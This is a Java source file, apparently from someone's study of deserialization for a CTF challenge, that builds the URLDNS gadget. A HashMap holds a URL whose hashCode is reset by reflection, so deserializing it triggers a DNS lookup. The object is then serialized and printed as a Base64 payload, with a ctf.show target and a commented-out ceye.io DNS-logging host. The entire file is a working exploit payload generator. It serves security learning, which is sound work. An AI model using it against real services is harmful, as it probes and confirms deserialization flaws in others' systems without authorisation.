package top.foreverwl.study.ser;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.stream.BaseStream;

/**
 * @program: CC1_v1
 * @description:
 * @author: 168
 * @create: 2024-07-18 10:52
 **/
public class UrlDns {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();
//        URL url = new URL("http://85p4wv.ceye.io");
        URL url = new URL("https://efa96c61-b972-407f-af05-8131b22636d8.challenge.ctf.show/");

        Field hashCode = Class.forName("java.net.URL").getDeclaredField("hashCode");
        hashCode.setAccessible(true);//反射机制将类中的私有字段设置为可访问的状态
        hashCode.set(url,1000);//设置url的hashCode的值不为-1
        System.out.println(url.hashCode());//输出hashCode 看是否修改成功
        hashMap.put(url,null);
        hashCode.set(url,-1);//修改为-1 为了触发dns查询
        // Serialize the hashMap
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.close();

        // Encode the serialized byte array using Base64
        String base64Encoded = Base64.getEncoder().encodeToString(baos.toByteArray());

        // Print the Base64 encoded string to the console
        System.out.println(base64Encoded);

//        //序列化操作
//        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.txt"));
////        System.out.println(Base64.Encoder(oos));
//        oos.writeObject(hashMap);
//        //反序列化操作
//        ObjectInputStream ois =new ObjectInputStream(new FileInputStream("ser.txt"));
//        ois.readObject();

    }
}
